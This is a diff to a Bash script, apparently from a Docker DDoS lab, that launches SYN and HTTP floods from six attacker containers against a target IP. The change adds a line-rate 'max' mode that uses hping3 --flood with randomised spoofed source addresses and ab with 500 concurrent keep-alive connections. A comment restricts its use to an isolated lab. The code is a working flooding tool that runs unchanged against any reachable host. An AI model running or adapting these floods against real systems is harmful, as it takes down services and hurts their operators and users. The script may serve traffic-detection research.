@@ -7,6 +7,12 @@
 #   ./run_ddos.sh http                        # 6 attacker HTTP flood 30s
 #   ./run_ddos.sh syn -t 172.30.0.10 -d 30    # chon target + thoi luong
 #   ./run_ddos.sh syn -r 400                  # SYN co pacing 400 pps/nguon (0 = toi da)
+#   ./run_ddos.sh syn -i max                  # cuong do TOI DA: hping3 --flood (6 nguon spoof)
+#   ./run_ddos.sh http -i max                 # cuong do TOI DA: ab -k -c 500 (6 nguon L7)
+#   ./run_ddos.sh syn -i max -r 50000         # max co gioi han ~50k pps/nguon (ramp an toan)
+#
+# intensity: paced (mac dinh) = scapy/http_flood.py co dieu tiet; max = hping3/ab line-rate.
+# CANH BAO: -i max sinh luu luong RAT LON. Chi chay trong lab co lap, co san 'pkill hping3/ab'.
 #
 # Ghi chu: neu user chua reload nhom docker trong phien dang nhap, script tu chay
 # lai chinh no duoi "sg docker -c ..." (khong can sudo khi da la thanh vien nhom docker).
@@ -24,7 +30,9 @@ fi
 MODE="syn"
 TARGET="172.30.0.10"
 DURATION=30
-PPS=""   # rong = khong truyen --pps (syn_flood tu hieu la toi da)
+PPS=""          # rong = khong truyen --pps (syn_flood tu hieu la toi da)
+INTENSITY="paced"
+MAXCONC=500     # che do max http: so ket noi dong thoi moi nguon cho ab
 
 # tham so dau tien (neu co) la mode syn|http, giong run_ddos.ps1
 if [[ "${1:-}" == "syn" || "${1:-}" == "http" ]]; then
@@ -32,26 +40,42 @@ if [[ "${1:-}" == "syn" || "${1:-}" == "http" ]]; then
 fi
 while [[ $# -gt 0 ]]; do
   case "$1" in
-    -t|--target)   TARGET="$2"; shift 2 ;;
-    -d|--duration) DURATION="$2"; shift 2 ;;
-    -r|--pps)      PPS="$2"; shift 2 ;;
-    syn|http)      MODE="$1"; shift ;;
+    -t|--target)    TARGET="$2"; shift 2 ;;
+    -d|--duration)  DURATION="$2"; shift 2 ;;
+    -r|--pps)       PPS="$2"; shift 2 ;;
+    -i|--intensity) INTENSITY="$2"; shift 2 ;;
+    syn|http)       MODE="$1"; shift ;;
     *) echo "[!] Tham so la: $1" >&2; exit 2 ;;
   esac
 done
+if [[ "$INTENSITY" != "paced" && "$INTENSITY" != "max" ]]; then
+  echo "[!] -i/--intensity chi nhan: paced | max" >&2; exit 2
+fi
 
 ATTACKERS=(attacker1 attacker2 attacker3 attacker4 attacker5 attacker6)
-echo "[*] Bat dau DDoS mode=$MODE tu ${#ATTACKERS[@]} nguon -> $TARGET trong ${DURATION}s"
+echo "[*] Bat dau DDoS mode=$MODE intensity=$INTENSITY tu ${#ATTACKERS[@]} nguon -> $TARGET trong ${DURATION}s"
 
 pids=()
 for a in "${ATTACKERS[@]}"; do
   if [[ "$MODE" == "syn" ]]; then
-    # SYN flood: spoof IP, dung timeout de dung dung thoi luong
-    cmd=(docker exec "$a" timeout "$DURATION" python3 /app/syn_flood.py "$TARGET" -p 80 --spoof)
-    [[ -n "$PPS" ]] && cmd+=(--pps "$PPS")
+    if [[ "$INTENSITY" == "max" ]]; then
+      # cuong do toi da: hping3 line-rate, --rand-source gia mao hang nghin IP nguon
+      cmd=(docker exec "$a" timeout "$DURATION" hping3 -S -p 80 -q --rand-source)
+      if [[ -n "$PPS" ]]; then cmd+=(-i "u$((1000000 / PPS))"); else cmd+=(--flood); fi
+      cmd+=("$TARGET")
+    else
+      # SYN flood scapy co pacing: spoof IP, dung timeout de dung dung thoi luong
+      cmd=(docker exec "$a" timeout "$DURATION" python3 /app/syn_flood.py "$TARGET" -p 80 --spoof)
+      [[ -n "$PPS" ]] && cmd+=(--pps "$PPS")
+    fi
   else
-    # HTTP flood L7: tu dung sau -d giay
-    cmd=(docker exec "$a" python3 /app/http_flood.py "$TARGET" -p 80 -t 20 -d "$DURATION")
+    if [[ "$INTENSITY" == "max" ]]; then
+      # L7 cuong do cao: ab keep-alive, concurrency cao, tu dung sau -t giay
+      cmd=(docker exec "$a" timeout "$DURATION" ab -k -c "$MAXCONC" -t "$DURATION" -n 100000000 "http://$TARGET/")
+    else
+      # HTTP flood L7 (urllib): tu dung sau -d giay
+      cmd=(docker exec "$a" python3 /app/http_flood.py "$TARGET" -p 80 -t 20 -d "$DURATION")
+    fi
   fi
   "${cmd[@]}" &
   pids+=($!)
